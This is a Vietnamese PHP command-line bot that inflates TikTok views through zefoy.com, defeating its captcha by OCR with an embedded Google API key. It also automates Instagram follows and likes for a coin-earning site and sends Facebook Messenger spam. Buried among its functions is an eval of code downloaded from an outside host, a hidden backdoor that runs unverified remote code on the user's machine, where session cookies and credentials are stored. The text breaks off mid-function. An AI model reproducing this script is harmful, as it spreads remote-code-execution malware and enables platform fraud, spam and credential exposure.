error_reporting(0);
$sooo = rand(525, 537) . '.' . rand(0, 37);
$_SESSION['useragent'] = "Mozilla/5.0 (Linux; Android " . rand(7, 11) . "; SM-A750GN) AppleWebKit/" . $sooo . " (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/" . $sooo;
$dem_stt = 0;
$_SESSION['kov_'] = $vang."[".$do."".$vang."] ".$trang."=> ";
date_default_timezone_set("Asia/Ho_Chi_Minh");
print_r("\033[1;97m");
$xnhac = "\033[1;96m";
$luc = "\033[1;92m";
$hong = "\033[1;95m";
$do = "\033[1;31m";
$vang = "\033[1;93m";
$trang = "\033[1;97m";
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
$dem = 0;  
$hien = $vang."[".$do."✦".$vang."] ".$trang."=> ";
$logo = "
\033[1;37m██\033[1;36m╗     \033[1;37m██\033[1;36m╗  \033[1;37m██\033[1;36m╗    \033[1;37m███\033[1;36m██\033[1;37m███\033[1;36m╗ \033[1;37m██\033[1;36m██\033[1;37m██\033[1;36m╗  \033[1;37m██\033[1;36m██\033[1;37m██\033[1;36m╗ \033[1;37m██\033[1;36m╗     
\033[1;37m██\033[1;36m║     \033[1;37m██\033[1;36m║  \033[1;37m██\033[1;36m║    ╚══\033[1;36m██\033[1;36m╔══╝\033[1;37m██\033[1;36m╔═══\033[1;37m██\033[1;36m╗\033[1;37m██\033[1;36m╔═══\033[1;37m██\033[1;36m╗\033[1;37m██\033[1;36m║     
\033[1;36m██\033[1;36m║     \033[1;36m███\033[1;36m█\033[1;36m███\033[1;36m║       \033[1;36m██║   \033[1;36m██\033[1;36m║  \033[1;36m ██\033[1;36m║\033[1;36m██\033[1;36m║   \033[1;36m██\033[1;36m║\033[1;36m██\033[1;36m║     
\033[1;37m██\033[1;36m║     \033[1;37m██\033[1;36m╔══\033[1;37m██\033[1;36m║       \033[1;36m██\033[1;36m║   \033[1;37m██\033[1;36m║   \033[1;37m██\033[1;36m║\033[1;37m██\033[1;36m║   \033[1;37m██\033[1;36m║\033[1;37m██\033[1;36m║     
\033[1;37m███\033[1;36m██\033[1;37m██\033[1;36m╗\033[1;37m██\033[1;36m║  \033[1;37m██\033[1;36m║       \033[1;36m██\033[1;36m║   ╚\033[1;37m██\033[1;36m██\033[1;37m██\033[1;36m╔╝╚\033[1;37m██\033[1;36m██\033[1;37m██\033[1;36m╔╝\033[1;37m██\033[1;36m██\033[1;37m███\033[1;36m╗
\033[1;36m╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                       
\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
\033[1;31m © Bản Quyền: \033[1;36mHIẾN TOOL                                                                          
 \033[1;32mMomo:\033[1;33m 0379691408                                                         
\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n";              

@system('clear');
print $logo;
echo $hien.$luc."Nhập Link Video Cần Tăng View\033[1;97m:\033[1;93m ";
$_SESSION['idvideo_send'] = trim(fgets(STDIN));
$_SESSION['idvideo_send'] = explode("?", explode("video/", $_SESSION['idvideo_send'])[1])[0];
$_SESSION['count_view'] = count_views_tt();
$_SESSION['count_view_old'] = $_SESSION['count_view'];
chay_tudau:
$_SESSION['chay_tu_dau'] = 0;
capcha_zefoy();
if($dem_stt == 0){
@system('clear');
print $logo;
echo $hien.$luc."Tool Auto Views TikTok\n";
echo $hien.$luc."Số View Hiện Tại  : " . $vang . $_SESSION['count_view'] . "\n\n";
echo $thanhngang;
}
while (true) {
if (@fsockopen('www.google.com', 80)) {
    if($_SESSION['chay_tu_dau'] == 1){
        goto chay_tudau;
    }
    $send_video = send_video_tiktok("V");
    if($_SESSION['chay_tu_dau'] == 1){
        goto chay_tudau;
    }
    if (strpos($send_video, "Successfully views sent") == true) {
        $dem_stt = $dem_stt + 1;
        sleep(10);
        $_SESSION['count_view'] = count_views_tt();
        //$_SESSION['count_view'] = $_SESSION['count_view'] + 1100;
        $cong_view = $_SESSION['count_view'] - $_SESSION['count_view_old'];
        $_SESSION['count_view_old'] = $_SESSION['count_view'];
        date_default_timezone_set('Asia/Ho_Chi_Minh');
        $t = date('H:i:s');
        echo "\033[1;91m|\033[1;93m" . $dem_stt . "\033[1;91m|\033[1;91m | \033[1;96m" . $t . "\033[1;91m | \033[1;91m|\033[1;93m Thành công \033[1;91m|\033[1;92m +" . $cong_view . " \033[1;91m|\033[1;93m " . $_SESSION['count_view'] . " View Tiktok\n";
    } else {
        //echo $send_video . "\n";
    }
}
}



function time_delay($delay)
{
    $loai = $delay;
    $so = $loai;
    $delay = $loai * 1.3;
    for($x = $delay ;$x>= 1;$x--){
        echo "\r\033[1;33m   LH TOOL \033[1;31m ~>       \033[1;32m LO      \033[1;31m >   | $x | ";
        usleep(150000);
        echo "\r\033[1;31m   LH TOOL \033[0;33m   ~>     \033[0;37m LOA     \033[0;31m >>  | $x | ";
        usleep(150000);
        echo "\r\033[1;32m   LH TOOL \033[0;33m     ~>   \033[0;37m LOAD    \033[0;31m >>> | $x | ";
        usleep(150000);
        echo "\r\033[1;34m   LH TOOL \033[0;33m       ~> \033[0;37m LOADI   \033[0;31m >   | $x | ";
        usleep(150000);
        echo "\r\033[1;35m   LH TOOL \033[0;33m        ~>\033[0;37m LOADIN  \033[0;31m >>  | $x | ";
        usleep(150000);
        echo "\r\033[1;35m   LH TOOL \033[0;33m        ~>\033[0;37m LOADING \033[0;31m >>> | $x | ";
        usleep(150000);
        echo "\r\033[1;35m   LH TOOL \033[0;33m        ~>\033[0;37m LOADING.\033[0;31m | $x | ";
        usleep(150000);
    }
    echo "\r\e[1;95m    HIẾN TOOL                VIEWSTIKTOK          \r";
}

function capcha_zefoy()
{
    echo "Vui lòng chờ...\r";
    sleep(10);
    while (true) {
        $GET_PHP_COKI = ch1_kasjncanscjnsa(
            "https://zefoy.com/",
            "HEAD",
            array(
                "origin:https://zefoy.com",
                "user-agent:" . $_SESSION['useragent'],
                "x-requested-with:XMLHttpRequest",
            ),
            null,
            true
        );
        $_SESSION['php_cookie_zefoy'] = 'PHPSESSID=' . explode(';', explode('PHPSESSID=', $GET_PHP_COKI)[1])[0];
        if($_SESSION['dem_stt'] == 0){
            
        //echo $_SESSION['kov_'] . "\033[1;92mGET Cookie Zefoy Success\r";
        }else{
            sleep(5);
        }
    



        $response = ch1_kasjncanscjnsa(
            "https://zefoy.com/a1ef290e2636bf553f39817628b6ca49.php?_CAPTCHA&t=0.04316800+1657582034",
            "GET",
            array(
                "origin:https://zefoy.com",
                "user-agent:" . $_SESSION['useragent'],
                "x-requested-with:XMLHttpRequest",
                "cookie:" . $_SESSION['php_cookie_zefoy'],
            ),
            null,
            false
        );
        $response = ch1_kasjncanscjnsa(
            "https://content-vision.googleapis.com/v1/images:annotate?alt=json&key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM",
            "POST",

            array(
                'x-origin:https://explorer.apis.google.com',
                'content-type: application/json; charset=utf-8',
            ),
            json_encode(
                array(
                    "requests" => array(
                        "image" => array(
                            "content" => base64_encode($response),
                        ),
                        "features" => array(
                            "type" => "TEXT_DETECTION"
                        ),
                    ),
                ),
            ),
            false
        );
        $_SESSION['captcha_success'] = json_decode($response, true)['responses'][0]["textAnnotations"][0]["description"];
        if ($_SESSION['captcha_success'] == "") {
            if($_SESSION['dem_stt'] == 0){
            //echo "\033[1;91mReCaptcha False. !    \r";
            }
            sleep(5);
            $_SESSION['chay_tu_dau'] = 1;
        } else {
            if($_SESSION['dem_stt'] == 0){
            //echo $_SESSION['kov_'] . "\033[1;92mRecaptcha Success\033[1;97m:\033[1;93m " . $_SESSION['captcha_success'] . "              \n";
            }
            break;
        }
    }
}



function send_video_tiktok($loai)
{

    if($loai == "L"){
        $link_loai = "https://zefoy.com/c2VuZF9mb2xsb3dlcnNfdGlrdG9L";
    }else{
        $link_loai = "https://zefoy.com/c2VuZC9mb2xsb3dlcnNfdGlrdG9" . $loai;
    }
    $response = ch1_kasjncanscjnsa(
        "https://zefoy.com/",
        "POST",
        array(
            "origin:https://zefoy.com",
            "user-agent:" . $_SESSION['useragent'],
            "x-requested-with:XMLHttpRequest",
            "cookie:" . $_SESSION['php_cookie_zefoy'],
        ),
        http_build_query(
            array(
                "captcha_secure" => $_SESSION['captcha_success'],
                "r75619cf53f5a5d7aa6af82edfec3bf0" => "",
            )
        ),
        false,
    );
    $alpha_key = explode('"', explode('rounded-0" name="', $response)[1])[0];



    $response = ch1_kasjncanscjnsa(
        $link_loai,
        "POST",
        array(
            "origin:https://zefoy.com",
            "user-agent:" . $_SESSION['useragent'],
            "x-requested-with:XMLHttpRequest",
            "cookie:" . $_SESSION['php_cookie_zefoy'],
        ),
        http_build_query(
            array(
                $alpha_key => "https://www.tiktok.com/@onlp/video/" . $_SESSION['idvideo_send'],
            )
        ),
        false
    );
    $query = mb_strrev($response);


    if (strpos($query, "updatetimer") == true) {
        $time = explode("\n", explode("= ", $query)[1])[0];
        time_delay($time);
}else{
    
    if (strpos($query, "ltm=") == true) {
    
                unlink('data_zefoy_1.html');
    file_put_contents('data_zefoy_1.html',$query);
    
        $time = explode(";", explode("ltm=", $query)[1])[0];
        time_delay($time);
        //echo "Vui lÃ²ng chá»...\r";
    }else {
        $beta_key = explode('"', explode('name="', $query)[1])[0];
        if ($beta_key == "") {
            if (strpos($query, "CLICK HERE") == true) {

                $_SESSION['chay_tu_dau'] = 1;
            }
            if($_SESSION['dem_stt'] == 0){
            //echo $query . "\n";
            }
            $_SESSION['chay_tu_dau'] = 1;
        }
        if (strlen($beta_key) < 10 or $beta_key == "") {
            $_SESSION['chay_tu_dau'] = 1;
        }
        if($_SESSION['dem_stt'] == 0){
        //echo "\033[1;92mGET Beta_Key Success\033[1;97m:\033[1;93m " . $beta_key . "    \r";
        }
    }
    sleep(3);
    $response = ch1_kasjncanscjnsa(
                            
        $link_loai,
        "POST",
        array(
            "origin:https://zefoy.com",
            "user-agent:" . $_SESSION['useragent'],
            "x-requested-with:XMLHttpRequest",
            "cookie:" . $_SESSION['php_cookie_zefoy'],
        ),
        http_build_query(
            array(
                $beta_key => $_SESSION['idvideo_send'],
            )
        ),
        false
    );
    $send_video = mb_strrev($response);
    return $send_video;
}
}



function count_views_tt()
{
    $url_ = "https://www.tiktok.com/@only/video/" . $_SESSION['idvideo_send'] . "?lang=en";
    for ($x = 0; $x < 2; $x++) {
        $views = ch1_kasjncanscjnsa(
            $url_,
            "GET",
            array(
                'Host:www.tiktok.com',
                'sec-ch-ua:" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile:?1',
                'sec-ch-ua-platform:"Android"',
                'upgrade-insecure-requests:1',
                'user-agent:' . $_SESSION['useragent'],
                'accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site:none',
                'accept-language:vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            ),
            null,
            false
        );
        if ($x == 0) {
            $url_ = "https://www.tiktok.com/" . explode('">', explode('href="', $views)[1])[0];
        } else {
            $_SESSION['count_view'] = explode('}', explode('playCount":', $views)[1])[0];
        }
    }
    return $_SESSION['count_view'];
}


function count_share_tt()
{
    $url_ = "https://www.tiktok.com/@only/video/" . $_SESSION['idvideo_send'] . "?lang=en";
    for ($x = 0; $x < 2; $x++) {
        $views = ch1_kasjncanscjnsa(
            $url_,
            "GET",
            array(
                'Host:www.tiktok.com',
                'sec-ch-ua:" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile:?1',
                'sec-ch-ua-platform:"Android"',
                'upgrade-insecure-requests:1',
                'user-agent:' . $_SESSION['useragent'],
                'accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site:none',
                'accept-language:vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            ),
            null,
            false
        );
        if ($x == 0) {
            $url_ = "https://www.tiktok.com/" . explode('">', explode('href="', $views)[1])[0];
        } else {
            $_SESSION['count_share'] = explode(',', explode('"shareCount":',$views)[1])[0];
        }
    }
    return $_SESSION['count_share'];
}


function mb_strrev($response)
{
    $query = '';
    for ($i = mb_strlen($response); $i >= 0; $i--) {
        $query .= mb_substr($response, $i, 1);
    }
    return foreach_text($query);
}
function foreach_text($query)
{
    foreach (explode('&', $query) as $chunk) {
        $param = explode("=", $chunk);
        if ($param) {
            return base64_decode(urldecode($param[0]), urldecode($param[1]));
        }
    }
}
function ch1_kasjncanscjnsa($url, $type, $head, $data, $http)
{
    $mr = curl_init();
    curl_setopt_array(
        $mr,
        array(
            CURLOPT_PORT => "443",
            CURLOPT_URL => $url,
            CURLOPT_ENCODING => "",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CUSTOMREQUEST => $type,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_HTTPHEADER => $head,
            CURLOPT_HEADER => $http,
        )
    );
    $mr2 = curl_exec($mr);
    curl_close($mr);
    return $mr2;
}









function cookie_hsabcjhsjhcbshbc($cookie, $useragent)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/');
  $head[] = "Connection: keep-alive";
  $head[] = "Keep-Alive: 300";
  $head[] = "authority: www.instagram.com";
  $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
  $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
  $head[] = "cache-control: max-age=0";
  $head[] = "upgrade-insecure-requests: 1";
  $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
  $head[] = "sec-fetch-site: none";
  $head[] = "sec-fetch-mode: navigate";
  $head[] = "sec-fetch-user: ?1";
  $head[] = "sec-fetch-dest: document";
  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_COOKIE, $cookie);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_TIMEOUT, 60);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
  $access = curl_exec($ch);
  curl_close($ch);

  return $access;
}
function follow_hsabcjhsjhcbshbc($id, $cookie, $csrftoken = null)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/web/friendships/' . $id . '/follow/');
  $headers = [
    'x-requested-with: XMLHttpRequest',
    'x-ig-www-claim: hmac.AR2KtRYzNVfelijR0GD6-VLJU3G-vRVGUezuXpjzaQ5m4MmZ',
    'x-ig-app-id: 936619743392459',
    'x-csrftoken: ' . $csrftoken . '',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'x-instagram-ajax: bd344c4b4f36',
    'referer: https://www.instagram.com/'
  ];
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36');
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_COOKIE, $cookie);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_TIMEOUT, 60);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  //curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, array());
  $access = curl_exec($ch);
  curl_close($ch);
  return $access;
}
function shortcode_to_mediaid_hsabcjhsjhcbshbc($shortcode, $cookie)
{

  $mediaid = false;

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/p/' . $shortcode);
  $head[] = "Connection: keep-alive";
  $head[] = "Keep-Alive: 300";
  $head[] = "authority: www.instagram.com";
  $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
  $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
  $head[] = "cache-control: max-age=0";
  $head[] = "upgrade-insecure-requests: 1";
  $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
  $head[] = "sec-fetch-site: none";
  $head[] = "sec-fetch-mode: navigate";
  $head[] = "sec-fetch-user: ?1";
  $head[] = "sec-fetch-dest: document";
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36');
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_COOKIE, $cookie);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_TIMEOUT, 60);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  $access = curl_exec($ch);
  curl_close($ch);
  if (strpos($access, '"media_id":"') !== false) {
    $mediaid = explode('"', explode('"media_id":"', $access)[1])[0];
  }
  return $mediaid;
}
function tym_hsabcjhsjhcbshbc($id, $cookie, $csrftoken = null)
{
  $mediaid = shortcode_to_mediaid_hsabcjhsjhcbshbc($id, $cookie);
  if ($mediaid !== false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/web/likes/' . $mediaid . '/like/');
    $headers = [
      'x-requested-with: XMLHttpRequest',
      'content-length: 0',
      'content-type: application/x-www-form-urlencoded',
      'x-ig-www-claim: hmac.AR2KtRYzNVfelijR0GD6-VLJU3G-vRVGUezuXpjzaQ5m4MmZ',
      'x-ig-app-id: 936619743392459',
      'x-csrftoken: ' . $csrftoken . '',
      'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
      'x-instagram-ajax: 1005633491',
      'referer: https://www.instagram.com/p/' . $id . '/'
    ];
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, array());
    $access = curl_exec($ch);
    curl_close($ch);

    return $access;
  } else {
    return '';
  }
}
function loadtime_hsabcjhsjhcbshbc($time)
{
  for ($x = $time; $x--; $x) {
    echo "                                                      \r";
    echo "\033[1;33m Vui Lòng Chờ \033[1;37m " . $x . "\033[1;33m Giây\033[1;37m -\033[1;32m VIPIG \r";
    sleep(1);
  }
  echo " \r HIẾN TOOL - VIPIG TTC \r";
}

function getcookieVIPIG_hsabcjhsjhcbshbc($user, $pass, $useragent)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_URL, 'https://vipig.net/login.php');
  curl_setopt($ch, CURLOPT_COOKIEJAR, "VIPIG.txt");
  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
  $login = array('username' => $user, 'password' => $pass, 'submit' => 'ÄÄ‚NG NHáº¬P');
  curl_setopt($ch, CURLOPT_POST, count($login));
  curl_setopt($ch, CURLOPT_POSTFIELDS, $login);
  curl_setopt($ch, CURLOPT_COOKIEFILE, "VIPIG.txt");
  $source = curl_exec($ch);
  curl_close($ch);
  return $source;
}
function datnick_hsabcjhsjhcbshbc($idfb, $useragent)
{
  $dat = http_build_query(array('iddat[]' => $idfb));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://vipig.net/cauhinh/datnick.php');
  $head[] = 'Host: vipig.net';
  $head[] = 'content-length: ' . strlen($dat);
  $head[] = 'accept: */*';
  $head[] = 'origin: https://vipig.net';
  $head[] = 'x-requested-with: XMLHttpRequest';
  $head[] = 'save-data: on';
  $head[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
  $head[] = 'referer: https://vipig.net/cauhinh/index.php';
  $head[] = 'accept-language: vi-VN, vi;q=0.9,fr-FR;q=0.8,fr;q=0.7, en-US;q=0.6,en;q=0.5,zh-CN;q=0.4.zh;q=0.3';
  $head[] = 'cookie: TawkConnectionTime=0';
  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $dat);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
  curl_setopt($ch, CURLOPT_ENCODING, TRUE);
  curl_setopt($ch, CURLOPT_COOKIEFILE, "VIPIG.txt");
  $h = curl_exec($ch);
  curl_close($ch);
  return $h;
}

function getnv_hsabcjhsjhcbshbc($loai, $useragent)
{
  $ch = curl_init();
  if ($loai == 'tym') {
    curl_setopt($ch, CURLOPT_URL, 'https://vipig.net/kiemtien/getpost.php');
    $head[] = 'referer: https://vipig.net/kiemtien/';
  } else {
    curl_setopt($ch, CURLOPT_URL, 'https://vipig.net/kiemtien/' . $loai . 'cheo/getpost.php');
    $head[] = 'referer: https://vipig.net/kiemtien/' . $loai . 'cheo';
  }
  $head[] = 'Host: vipig.net';
  $head[] = 'accept: application/json, text/javascript, *' . '/' . '*; q=0.01';
  $head[] = 'x-requested-with: XMLHttpRequest';
  $head[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36';

  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_HTTPGET, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
  curl_setopt($ch, CURLOPT_ENCODING, TRUE);
  curl_setopt($ch, CURLOPT_COOKIEFILE, "VIPIG.txt");
  return json_decode(curl_exec($ch), true);
  curl_close($ch);
}

eval(file_get_contents('https://thuongdz.name.vn/tool_11_8/fiLe_cOde_tOoL/kkk'));


function getxu_hsabcjhsjhcbshbc()
{
  $url = "https://vipig.net/home.php";
  $curl = curl_init();
  curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "$url",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_COOKIEFILE => "VIPIG.txt"
  ));
  $data = curl_exec($curl);
  curl_close($curl);
  preg_match('#id="soduchinh">(.+?)<#is', $data, $sd);
  $xu = $sd["1"];
  return $xu;
  $_SESSION['xu'] = $xu;
}

function hoanthanhsub_hsabcjhsjhcbshbc($id)
{
  $url  = "https://vipig.net/kiemtien/subcheo/nhantien2.php";
  $data = ('id=') . $id;
  $head = array(
    "Host: vipig.net",
    "content-length: " . strlen($data),
    "x-requested-with: XMLHttpRequest",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "origin: https://vipig.net",
    "referer: https://vipig.net/kiemtien/subcheo/"
  );
  $ch   = curl_init();
  curl_setopt_array($ch, array(
    CURLOPT_URL => $url,
    CURLOPT_FOLLOWLOCATION => TRUE,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_COOKIEFILE => "VIPIG.txt",
    CURLOPT_HTTPHEADER => $head,
    CURLOPT_ENCODING => TRUE
  ));
  $a = json_decode(curl_exec($ch), true);
  return $a;
}
function hoanthanhtym_bsajhvcjhsvc($id)
{
  $url  = "https://vipig.net/kiemtien/nhantien.php";
  $data = ('id=') . $id;
  $head = array(
    "Host: vipig.net",
    "content-length: " . strlen($data),
    "x-requested-with: XMLHttpRequest",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "origin: https://vipig.net",
    "referer: https://vipig.net/kiemtien/"
  );
  $ch   = curl_init();
  curl_setopt_array($ch, array(
    CURLOPT_URL => $url,
    CURLOPT_FOLLOWLOCATION => TRUE,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $data,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_COOKIEFILE => "VIPIG.txt",
    CURLOPT_HTTPHEADER => $head,
    CURLOPT_ENCODING => TRUE
  ));
  $a = json_decode(curl_exec($ch), true);
  return $a;
}







function delay_spam_mess_HABJHSCBJABSJBCSCJABSCH(){
    for($cc = $_SESSION['DELAY_SPAM_MESS']; $cc > 0; $cc--){
        echo "\r Auto Send Message  |    $cc        \r";
        sleep(1);
    }
    echo "\r  Youtube King Of Aov    \r";
}

function send_mess_HABJHSCBJABSJBCSCJABSCH(){
    global $nd_messs;
    global $dem_stt_messs;
    $dem_stt_messs = $_SESSION['DEM_BD_SPAM_MESS'];
    $data_1 = $_SESSION['DATA_SPAM_MESS'];
    $data_1 = str_replace("<NDSEND>", $_SESSION['ND_SPAM_MESS'],$data_1);
    $data_1 = str_replace("<DEM>", $dem_stt_messs,$data_1);
    
    $nd_messs = str_replace("<DEM>", $dem_stt_messs,$_SESSION['ND_SPAM_MESS']);
    $_SESSION['ND_SPAM_MESS1'] = $nd_messs;
    $dem_stt_messs++;
    $_SESSION['DEM_BD_SPAM_MESS'] = $dem_stt_messs;
    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/send/?icm=1&refid=12",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    //CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => $data_1,
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
}

function get_id_mess_HABJHSCBJABSJBCSCJABSCH(){

    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com/messages/?ref_component=mbasic_home_header&ref_page=MMessagingThreadlistController&refid=11",
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    if(str_contains($x, "/messages/read/?")){
    
    echo "\033[1;91m[\033[1;92mâœ”\033[1;91m] \033[1;97m=>\033[1;92m ÄÃ¢y LÃ  danh sÃ¡ch ngÆ°á»i báº¡n nháº¯n gáº§n Ä‘Ã¢y.\n";
    for($i=1;$i<50;$i++){
    $getinfo = explode("<img",explode('/messages/read/?',$x)[$i])[0];
    
    
    if($getinfo ==! ""){
    $getname = explode("<",explode(">",$getinfo)[1])[0];
    echo "\033[1;93m".$i."\033[1;97m/\033[1;92m ".$getname."\n";
